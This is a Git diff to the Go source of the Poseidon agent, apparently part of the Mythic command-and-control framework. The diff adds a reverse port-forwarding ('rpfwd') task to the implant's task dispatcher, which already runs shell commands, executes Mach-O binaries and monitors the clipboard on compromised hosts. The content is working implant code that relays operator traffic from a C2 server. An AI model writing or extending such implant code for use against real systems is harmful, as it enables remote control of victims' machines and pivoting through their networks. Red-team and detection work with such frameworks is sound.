@@ -3,6 +3,7 @@ package main
 import (
 	"C"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/execute_macho"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/rpfwd"
 
 	// Standard
 	"encoding/json"
@@ -66,7 +67,7 @@ import (
 
 const (
 	NONE_CODE = 100
-	EXIT_CODE = 0
+	EXIT_CODE = -1
 )
 
 // list of currently running tasks
@@ -130,6 +131,7 @@ var tasktypes = map[string]int{
 	"run":               47,
 	"clipboard_monitor": 48,
 	"execute_macho":     49,
+	"rpfwd":             50,
 	"none":              NONE_CODE,
 }
 
@@ -246,6 +248,10 @@ func handleMythicMessageResponse(mythicMessage structs.MythicMessageResponse) {
 		profiles.FromMythicSocksChannel <- mythicMessage.Socks[j]
 		//fmt.Printf("sent socks message to profiles.FromMythicSocksChannel %v\n", mythicMessage.Socks[j].ServerId)
 	}
+	// loop through each rpwfd message and send it off
+	for j := 0; j < len(mythicMessage.Rpfwds); j++ {
+		profiles.FromMythicRpfwdChannel <- mythicMessage.Rpfwds[j]
+	}
 	// sort the Tasks
 	sort.Slice(mythicMessage.Tasks, func(i, j int) bool {
 		return mythicMessage.Tasks[i].Timestamp < mythicMessage.Tasks[j].Timestamp
@@ -335,7 +341,6 @@ func handleNewTask() {
 				os.Exit(0)
 				break
 			case 1:
-				// Run shell command
 				go shell.Run(task)
 				break
 			case 2:
@@ -489,6 +494,9 @@ func handleNewTask() {
 				break
 			case 49:
 				go execute_macho.Run(task)
+				break
+			case 50:
+				go rpfwd.Run(task)
 				break
 			case NONE_CODE:
 				// No tasks, do nothing
